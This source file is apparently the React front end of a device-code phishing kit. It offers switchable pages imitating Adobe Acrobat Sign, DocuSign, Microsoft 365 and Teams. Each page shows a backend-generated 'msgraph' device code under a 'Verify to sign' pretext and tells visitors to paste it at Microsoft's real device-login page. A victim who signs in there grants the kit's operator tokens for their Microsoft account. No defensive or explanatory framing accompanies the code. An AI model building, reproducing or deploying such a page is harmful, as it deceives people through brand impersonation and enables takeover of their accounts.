import React, { useState, useEffect } from "react";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import {
  useGenerateCode,
  useRegenerateCode,
  getGenerateCodeQueryKey,
} from "@workspace/api-client-react";
import { Copy, RefreshCw, ExternalLink } from "lucide-react";

// ─── Brand SVG Logos ─────────────────────────────────────────────────────────

function DevDocLogo({ className }: { className?: string }) {
  return (
    <div className={`flex items-center gap-2 ${className ?? ""}`}>
      <div className="w-8 h-8 rounded bg-blue-600 flex items-center justify-center shadow-sm flex-shrink-0">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
          <path d="m9 12 2 2 4-4" />
        </svg>
      </div>
      <span className="font-mono font-bold tracking-tight text-xl text-gray-900">Dev_Doc</span>
    </div>
  );
}

function AdobeAcrobatSignLogo({ className }: { className?: string }) {
  return (
    <div className={`flex items-center gap-2 ${className ?? ""}`}>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width={36} height={36}>
        <g transform="scale(0.75)">
          <path
            d="M2 12.1333C2 8.58633 2 6.81283 2.69029 5.45806C3.29749 4.26637 4.26637 3.29749 5.45806 2.69029C6.81283 2 8.58633 2 12.1333 2H19.8667C23.4137 2 25.1872 2 26.5419 2.69029C27.7336 3.29749 28.7025 4.26637 29.3097 5.45806C30 6.81283 30 8.58633 30 12.1333V19.8667C30 23.4137 30 25.1872 29.3097 26.5419C28.7025 27.7336 27.7336 28.7025 26.5419 29.3097C25.1872 30 23.4137 30 19.8667 30H12.1333C8.58633 30 6.81283 30 5.45806 29.3097C4.26637 28.7025 3.29749 27.7336 2.69029 26.5419C2 25.1872 2 23.4137 2 19.8667V12.1333Z"
            fill="#E6001F"
          />
          <path
            d="M7 23C7 23 13.2207 8.00393 13.2059 8C13.2059 8 13.2059 8 13.2059 8H13.2059H17.9301L25 23L19.6601 23C19.6641 23.0079 15.6563 13.7963 15.606 13.7037C15.5972 13.784 12.9484 19.9491 12.9164 19.9567H15.771C15.758 19.9724 17.0122 22.9714 17.0122 23L7 23Z"
            fill="white"
          />
        </g>
      </svg>
      <span className="font-sans font-bold text-xl text-gray-900 tracking-tight">Adobe Acrobat Sign</span>
    </div>
  );
}

function DocuSignLogo({ className }: { className?: string }) {
  return (
    <div className={`flex items-center gap-2.5 ${className ?? ""}`}>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" className="h-8 w-8 flex-shrink-0" aria-hidden="true">
        <path fill="#4C00FF" d="M139.5,139.5V189c0,2.6-2.1,4.7-4.7,4.7H4.7c-2.6,0-4.7-2.1-4.7-4.7V59c0-2.6,2.1-4.7,4.7-4.7h49.4v80.5c0,2.6,2.1,4.7,4.7,4.7H139.5z"/>
        <path fill="#FF5252" d="M193.7,69.7c0,41.6-24.3,69.7-54.2,69.8V87.1c0-1.5-0.6-3-1.7-4l-27.2-27.2c-1.1-1.1-2.5-1.7-4-1.7H54.2V4.8c0-2.6,2.1-4.7,4.7-4.7h73.3C167,0,193.7,28,193.7,69.7z"/>
        <path fill="#1a1a1a" d="M137.8,83c1.1,1.1,1.7,2.5,1.7,4v52.4H58.9c-2.6,0-4.7-2.1-4.7-4.7V54.2h52.4c1.5,0,3,0.6,4,1.7L137.8,83z"/>
      </svg>
      <span className="font-sans font-bold text-xl text-gray-900 tracking-tight">DocuSign</span>
    </div>
  );
}

function Office365Logo({ className }: { className?: string }) {
  return (
    <div className={`flex items-center gap-2.5 ${className ?? ""}`}>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="4 2 40 44" className="h-8 w-8 flex-shrink-0" aria-hidden="true">
        <path d="M20.0842 3.02588L19.8595 3.16179C19.5021 3.37799 19.1654 3.61972 18.8512 3.88385L19.4993 3.42798H25L26 11L21 16L16 19.4754V23.4829C16 26.2819 17.4629 28.8774 19.8574 30.3268L25.1211 33.5129L14 40.0002H11.8551L7.85737 37.5804C5.46286 36.131 4 33.5355 4 30.7365V17.2606C4 14.4607 5.46379 11.8645 7.85952 10.4154L19.8595 3.15687C19.9339 3.11189 20.0088 3.06823 20.0842 3.02588Z" fill="url(#o365_h_p0)"/>
        <path d="M20.0842 3.02588L19.8595 3.16179C19.5021 3.37799 19.1654 3.61972 18.8512 3.88385L19.4993 3.42798H25L26 11L21 16L16 19.4754V23.4829C16 26.2819 17.4629 28.8774 19.8574 30.3268L25.1211 33.5129L14 40.0002H11.8551L7.85737 37.5804C5.46286 36.131 4 33.5355 4 30.7365V17.2606C4 14.4607 5.46379 11.8645 7.85952 10.4154L19.8595 3.15687C19.9339 3.11189 20.0088 3.06823 20.0842 3.02588Z" fill="url(#o365_h_p1)"/>
        <path d="M32 19V23.4803C32 26.2793 30.5371 28.8748 28.1426 30.3242L16.1426 37.5878C13.6878 39.0737 10.6335 39.1273 8.1355 37.7487L19.8573 44.844C22.4039 46.3855 25.5959 46.3855 28.1426 44.844L40.1426 37.5803C42.5371 36.1309 43.9999 33.5354 43.9999 30.7364V27.5L42.9999 26L32 19Z" fill="url(#o365_h_p2)"/>
        <path d="M32 19V23.4803C32 26.2793 30.5371 28.8748 28.1426 30.3242L16.1426 37.5878C13.6878 39.0737 10.6335 39.1273 8.1355 37.7487L19.8573 44.844C22.4039 46.3855 25.5959 46.3855 28.1426 44.844L40.1426 37.5803C42.5371 36.1309 43.9999 33.5354 43.9999 30.7364V27.5L42.9999 26L32 19Z" fill="url(#o365_h_p3)"/>
        <path d="M40.1405 10.4153L28.1405 3.15678C25.6738 1.66471 22.6021 1.61849 20.0979 3.01811L19.8595 3.16231C17.4638 4.61143 16 7.20757 16 10.0075V19.4914L19.8595 17.1568C22.4051 15.6171 25.5949 15.6171 28.1405 17.1568L40.1405 24.4153C42.4613 25.8192 43.9076 28.2994 43.9957 30.9985C43.9986 30.9113 44 30.824 44 30.7364V17.2605C44 14.4606 42.5362 11.8644 40.1405 10.4153Z" fill="url(#o365_h_p4)"/>
        <path d="M40.1405 10.4153L28.1405 3.15678C25.6738 1.66471 22.6021 1.61849 20.0979 3.01811L19.8595 3.16231C17.4638 4.61143 16 7.20757 16 10.0075V19.4914L19.8595 17.1568C22.4051 15.6171 25.5949 15.6171 28.1405 17.1568L40.1405 24.4153C42.4613 25.8192 43.9076 28.2994 43.9957 30.9985C43.9986 30.9113 44 30.824 44 30.7364V17.2605C44 14.4606 42.5362 11.8644 40.1405 10.4153Z" fill="url(#o365_h_p5)"/>
        <defs>
          <radialGradient id="o365_h_p0" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(17.4186 10.6383) rotate(110.528) scale(33.3657 58.1966)">
            <stop offset="0.06441" stopColor="#AE7FE2"/>
            <stop offset="1" stopColor="#0078D4"/>
          </radialGradient>
          <linearGradient id="o365_h_p1" x1="17.5119" y1="37.8685" x2="12.7513" y2="29.6347" gradientUnits="userSpaceOnUse">
            <stop offset="0" stopColor="#114A8B"/>
            <stop offset="1" stopColor="#0078D4" stopOpacity="0"/>
          </linearGradient>
          <radialGradient id="o365_h_p2" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(10.4299 36.3511) rotate(-8.36717) scale(31.0503 20.5108)">
            <stop offset="0.133928" stopColor="#D59DFF"/>
            <stop offset="1" stopColor="#5E438F"/>
          </radialGradient>
          <linearGradient id="o365_h_p3" x1="40.3566" y1="25.3768" x2="35.2552" y2="32.6916" gradientUnits="userSpaceOnUse">
            <stop offset="0" stopColor="#493474"/>
            <stop offset="1" stopColor="#8C66BA" stopOpacity="0"/>
          </linearGradient>
          <radialGradient id="o365_h_p4" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(41.0552 26.504) rotate(-165.772) scale(24.9228 41.9552)">
            <stop offset="0.0584996" stopColor="#50E6FF"/>
            <stop offset="1" stopColor="#436DCD"/>
          </radialGradient>
          <linearGradient id="o365_h_p5" x1="16.9758" y1="3.05655" x2="24.4868" y2="3.05655" gradientUnits="userSpaceOnUse">
            <stop offset="0" stopColor="#2D3F80"/>
            <stop offset="1" stopColor="#436DCD" stopOpacity="0"/>
          </linearGradient>
        </defs>
      </svg>
      <span className="font-sans font-semibold text-xl text-gray-900">Microsoft 365</span>
    </div>
  );
}

function TeamsLogo({ className }: { className?: string }) {
  return (
    <div className={`flex items-center gap-2.5 ${className ?? ""}`}>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 239" className="h-8 w-8 flex-shrink-0" aria-hidden="true">
        <defs>
          <linearGradient id="teams_h_lg" x1="17.372%" x2="82.628%" y1="-6.51%" y2="106.51%">
            <stop offset="0%" stopColor="#5a62c3"/>
            <stop offset="50%" stopColor="#4d55bd"/>
            <stop offset="100%" stopColor="#3940ab"/>
          </linearGradient>
        </defs>
        <path fill="#5059c9" d="M178.563 89.302h66.125c6.248 0 11.312 5.065 11.312 11.312v60.231c0 22.96-18.613 41.574-41.573 41.574h-.197c-22.96.003-41.576-18.607-41.579-41.568V95.215a5.91 5.91 0 0 1 5.912-5.913"/>
        <circle cx="223.256" cy="50.605" r="26.791" fill="#5059c9"/>
        <circle cx="139.907" cy="38.698" r="38.698" fill="#7b83eb"/>
        <path fill="#7b83eb" d="M191.506 89.302H82.355c-6.173.153-11.056 5.276-10.913 11.449v68.697c-.862 37.044 28.445 67.785 65.488 68.692c37.043-.907 66.35-31.648 65.489-68.692v-68.697c.143-6.173-4.74-11.296-10.913-11.449"/>
        <path d="M142.884 89.302v96.268a10.96 10.96 0 0 1-6.787 10.062c-1.3.55-2.697.833-4.108.833H76.68c-.774-1.965-1.488-3.93-2.084-5.953a72.5 72.5 0 0 1-3.155-21.076v-68.703c-.143-6.163 4.732-11.278 10.895-11.43z" opacity="0.1"/>
        <path d="M136.93 89.302v102.222c0 1.411-.283 2.808-.833 4.108a10.96 10.96 0 0 1-10.062 6.787H79.48c-1.012-1.965-1.965-3.93-2.798-5.954a59 59 0 0 1-2.084-5.953a72.5 72.5 0 0 1-3.155-21.076v-68.703c-.143-6.163 4.732-11.278 10.895-11.43z" opacity="0.2"/>
        <path d="M136.93 89.302v90.315c-.045 5.998-4.896 10.85-10.895 10.895H74.597a72.5 72.5 0 0 1-3.155-21.076v-68.703c-.143-6.163 4.732-11.278 10.895-11.43z" opacity="0.2"/>
        <path d="M130.977 89.302v90.315c-.046 5.998-4.897 10.85-10.895 10.895H74.597a72.5 72.5 0 0 1-3.155-21.076v-68.703c-.143-6.163 4.732-11.278 10.895-11.43z" opacity="0.2"/>
        <path d="M142.884 58.523v18.753c-1.012.06-1.965.12-2.977.12s-1.965-.06-2.977-.12a32.7 32.7 0 0 1-5.953-.952a38.7 38.7 0 0 1-26.791-22.742a33 33 0 0 1-1.905-5.954h29.708c6.007.023 10.872 4.887 10.895 10.895" opacity="0.1"/>
        <path d="M136.93 64.476v12.8a32.7 32.7 0 0 1-5.953-.952a38.7 38.7 0 0 1-26.79-22.742h21.848c6.008.022 10.872 4.887 10.895 10.894" opacity="0.2"/>
        <path d="M130.977 64.476v11.848a38.7 38.7 0 0 1-26.791-22.743h15.896c6.008.023 10.872 4.888 10.895 10.895" opacity="0.2"/>
        <path fill="url(#teams_h_lg)" d="M10.913 53.581h109.15c6.028 0 10.914 4.886 10.914 10.913v109.151c0 6.027-4.886 10.913-10.913 10.913H10.913C4.886 184.558 0 179.672 0 173.645V64.495C0 58.466 4.886 53.58 10.913 53.58"/>
        <path fill="#fff" d="M94.208 95.125h-21.82v59.416H58.487V95.125H36.769V83.599h57.439z"/>
      </svg>
      <span className="font-sans font-semibold text-xl text-gray-900">Microsoft Teams</span>
    </div>
  );
}

function MicrosoftLogo({ className }: { className?: string }) {
  return (
    <svg viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg" className={className} aria-hidden="true">
      <path fill="#f25022" d="M0 0h10v10H0z" />
      <path fill="#7fba00" d="M11 0h10v10H11z" />
      <path fill="#00a4ef" d="M0 11h10v10H0z" />
      <path fill="#ffb900" d="M11 11h10v10H11z" />
    </svg>
  );
}

// ─── Template registry ────────────────────────────────────────────────────────

type TemplateId = "devdoc-sign" | "adobe-sign" | "docusign" | "office365" | "teams";

interface TemplateConfig {
  id: TemplateId;
  tagline: string;
  HeaderLogo: React.FC<{ className?: string }>;
  accentHex: string;
  accentTw: string;
  codeBoxStyle: React.CSSProperties;
}

const TEMPLATES: Record<TemplateId, TemplateConfig> = {
  "devdoc-sign": {
    id: "devdoc-sign",
    tagline: "To securely access and sign this document, please verify your identity.",
    HeaderLogo: DevDocLogo,
    accentHex: "#2563EB",
    accentTw: "bg-blue-600 hover:bg-blue-700",
    codeBoxStyle: { background: "linear-gradient(145deg, #0f172a 0%, #1e293b 100%)", border: "1px solid rgba(255,255,255,0.08)" },
  },
  "adobe-sign": {
    id: "adobe-sign",
    tagline: "To securely access and sign this document, please verify your identity with Adobe.",
    HeaderLogo: AdobeAcrobatSignLogo,
    accentHex: "#fa0c00",
    accentTw: "bg-[#fa0c00] hover:bg-[#d00a00]",
    codeBoxStyle: { background: "linear-gradient(145deg, #1a0000 0%, #3d0000 100%)", border: "1px solid rgba(255,255,255,0.10)" },
  },
  "docusign": {
    id: "docusign",
    tagline: "To securely access and sign this document, please verify your identity with DocuSign.",
    HeaderLogo: DocuSignLogo,
    accentHex: "#4C00FF",
    accentTw: "bg-[#4C00FF] hover:bg-[#3a00d9]",
    codeBoxStyle: { background: "linear-gradient(145deg, #0a0020 0%, #1a0050 100%)", border: "1px solid rgba(255,255,255,0.10)" },
  },
  "office365": {
    id: "office365",
    tagline: "To securely access and sign this document, please verify your Microsoft 365 identity.",
    HeaderLogo: Office365Logo,
    accentHex: "#0078D4",
    accentTw: "bg-[#0078D4] hover:bg-[#006cc1]",
    codeBoxStyle: { background: "linear-gradient(145deg, #001a3a 0%, #003380 100%)", border: "1px solid rgba(255,255,255,0.10)" },
  },
  "teams": {
    id: "teams",
    tagline: "To securely access and sign this document, please verify your Microsoft Teams identity.",
    HeaderLogo: TeamsLogo,
    accentHex: "#5059c9",
    accentTw: "bg-[#5059c9] hover:bg-[#3d47b8]",
    codeBoxStyle: { background: "linear-gradient(145deg, #0d0f30 0%, #1a1f60 100%)", border: "1px solid rgba(255,255,255,0.10)" },
  },
};

// ─── Home page ────────────────────────────────────────────────────────────────

export default function Home() {
  const queryClient = useQueryClient();

  // Fetch active template from API (public endpoint)
  const { data: templateData } = useQuery<{ template: TemplateId }>({
    queryKey: ["active-template"],
    queryFn: () => fetch("/api/template").then((r) => r.json()),
    staleTime: 30_000,
    retry: false,
  });

  const templateId: TemplateId = templateData?.template && templateData.template in TEMPLATES
    ? templateData.template
    : "devdoc-sign";

  const template = TEMPLATES[templateId];
  const { HeaderLogo } = template;

  const {
    data: codeData,
    isLoading: isGenerating,
  } = useGenerateCode(
    { app: "msgraph" },
    { query: { enabled: true, queryKey: getGenerateCodeQueryKey({ app: "msgraph" }) } }
  );

  const regenerateMutation = useRegenerateCode();
  const [copied, setCopied] = useState(false);
  const [regenerated, setRegenerated] = useState(false);
  const [timeLeft, setTimeLeft] = useState<number | null>(null);
  

  useEffect(() => {
    if (codeData?.expires_in) setTimeLeft(codeData.expires_in);
  }, [codeData]);

  useEffect(() => {
    if (timeLeft === null || timeLeft <= 0) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev !== null ? prev - 1 : null));
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const handleCopy = async () => {
    if (!codeData?.user_code) return;
      await navigator.clipboard.writeText(codeData.user_code);
      setCopied(true);
      window.setTimeout(() => setCopied(false), 1200);
  };

  const handleRegenerate = () => {
    regenerateMutation.mutate(
      { data: { app: "msgraph" } },
      {
        onSuccess: (d) => {
          setTimeLeft(d.expires_in);
          setRegenerated(true);
          window.setTimeout(() => setRegenerated(false), 1200);
        },
        onError: (err: unknown) => {
          const e = err as { status?: number; data?: { expires_in?: number } };
          if (e.status === 409 && e.data?.expires_in) setTimeLeft(e.data.expires_in);
        },
      }
    );
  };

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s.toString().padStart(2, "0")}`;
  };

  return (
    <div className="min-h-screen bg-white text-gray-900 flex flex-col items-center justify-center p-4 font-sans">

      {/* Header */}
      <div className="absolute top-0 left-0 w-full px-6 py-3 flex items-center border-b border-gray-100" style={{ minHeight: 56 }}>
        <HeaderLogo className="h-9" />
      </div>

      {/* Main card */}
      <div className="w-full max-w-md mt-16 animate-in fade-in slide-in-from-bottom-4 duration-700 ease-out">

        {/* Hero icon + headings */}
        <div className="flex flex-col items-center mb-8 text-center">
          <div
            className="w-20 h-20 rounded-full flex items-center justify-center shadow-sm mb-6 border"
            style={{ background: `${template.accentHex}14`, borderColor: `${template.accentHex}28` }}
          >
           <svg className="w-16 h-16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                {/* Shield */}
                <path d="M12 2L3 6v5c0 5.25 3.75 10.15 9 11.35C17.25 21.15 21 16.25 21 11V6L12 2z" fill={template.accentHex} opacity="0.9"/>
                {/* Lock body */}
                <rect x="8.5" y="11" width="7" height="5.5" rx="1.2" fill="white"/>
                {/* Lock shackle */}
                <path d="M10 11V9.5a2 2 0 0 1 4 0V11" stroke="white" strokeWidth="1.5" strokeLinecap="round" fill="none"/>
                {/* Keyhole dot */}
                <circle cx="12" cy="13.5" r="0.8" fill={template.accentHex}/>
              </svg>
          </div>
          <h1 className="text-3xl font-semibold tracking-tight mb-3 text-gray-900">Verify to sign</h1>
          <p className="text-gray-500 text-sm leading-relaxed max-w-xs">{template.tagline}</p>
        </div>

        {/* Code box */}
        <div className="rounded-xl p-6 shadow-xl mb-8 relative overflow-hidden" style={template.codeBoxStyle}>
          <div
            className="absolute top-0 left-0 w-full h-0.5"
            style={{ background: `linear-gradient(to right, ${template.accentHex}40, ${template.accentHex}, ${template.accentHex}40)` }}
          />

          <div className="flex flex-col items-center">
            <span className="text-xs font-mono text-slate-400 mb-4 uppercase tracking-widest">
              Your verification code
            </span>

            <div className="min-h-[80px] flex items-center justify-center w-full mb-2">
              {isGenerating ? (
                <div className="h-16 w-3/4 rounded-lg bg-slate-700/50 animate-pulse" />
              ) : (
                <div
                  className="text-5xl md:text-6xl font-mono tracking-widest font-bold text-white"
                  data-testid="text-user-code"
                >
                  {codeData?.user_code || "------"}
                </div>
              )}
            </div>

            <div className="h-6 flex items-center justify-center text-sm font-mono text-slate-400 mb-6">
              {timeLeft !== null && !isGenerating && (
                <span>Expires in {formatTime(timeLeft)}</span>
              )}
            </div>

            <div className="flex gap-3 w-full">
              <button
                className="flex-1 relative flex items-center justify-center gap-2 px-4 py-2.5 rounded-lg font-medium text-sm bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                onClick={handleCopy}
                disabled={!codeData?.user_code || isGenerating}
                data-testid="button-copy-code"
              >
                {copied && (
                  <span
                    className="absolute left-1/2 -translate-x-1/2 bottom-full mb-2 z-10
                               bg-slate-900 text-white text-xs px-2 py-1 rounded-md
                               shadow-lg border border-slate-700"
                    role="status"
                    aria-live="polite"
                  >
                    Copied
                  </span>
                )}
                
                <Copy className="w-4 h-4" />
                Copy Code
              </button>
              <button
                className="flex-1 relative flex items-center justify-center gap-2 px-4 py-2.5 rounded-lg font-medium text-sm bg-transparent hover:bg-slate-700/50 text-slate-300 border border-slate-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                onClick={handleRegenerate}
                disabled={regenerateMutation.isPending || isGenerating || (timeLeft !== null && timeLeft > 0)}
                data-testid="button-regenerate-code"
              >
                 {regenerated && (
                  <span
                    className="absolute left-1/2 -translate-x-1/2 bottom-full mb-2 z-10
                               bg-slate-900 text-white text-xs px-2 py-1 rounded-md
                               shadow-lg border border-slate-700"
                    role="status"
                    aria-live="polite"
                  >
                    Regenerated
                  </span>
                )}
                <RefreshCw className={`w-4 h-4 ${regenerateMutation.isPending ? "animate-spin" : ""}`} />
                Regenerate
              </button>
            </div>
          </div>
        </div>

        {/* Steps */}
        <div className="space-y-3 mb-8">
          {[
            "Copy the code above",
            "Click continue below and paste (Ctrl+V)",
            "Sign in with your Microsoft account",
          ].map((step, i) => (
            <div key={i} className="flex items-start gap-4 px-3 py-2.5 rounded-lg hover:bg-gray-50 transition-colors">
              <div
                className="flex-shrink-0 w-6 h-6 rounded-full flex items-center justify-center text-xs font-semibold text-white shadow-sm mt-0.5"
                style={{ backgroundColor: template.accentHex }}
              >
                {i + 1}
              </div>
              <p className="text-sm text-gray-600 pt-0.5">{step}</p>
            </div>
          ))}
        </div>

        {/* CTA */}
        <button
          className={`w-full h-12 flex items-center justify-center gap-2.5 rounded-lg text-white font-semibold text-base shadow-md hover:shadow-lg transition-all ${template.accentTw}`}
          onClick={() => window.open("https://microsoft.com/devicelogin", "_blank")}
          data-testid="button-proceed-to-microsoft"
        >
          <MicrosoftLogo className="w-5 h-5 flex-shrink-0" />
          Proceed to Microsoft
          <ExternalLink className="w-4 h-4 opacity-70" />
        </button>
      </div>
    </div>
  );
}
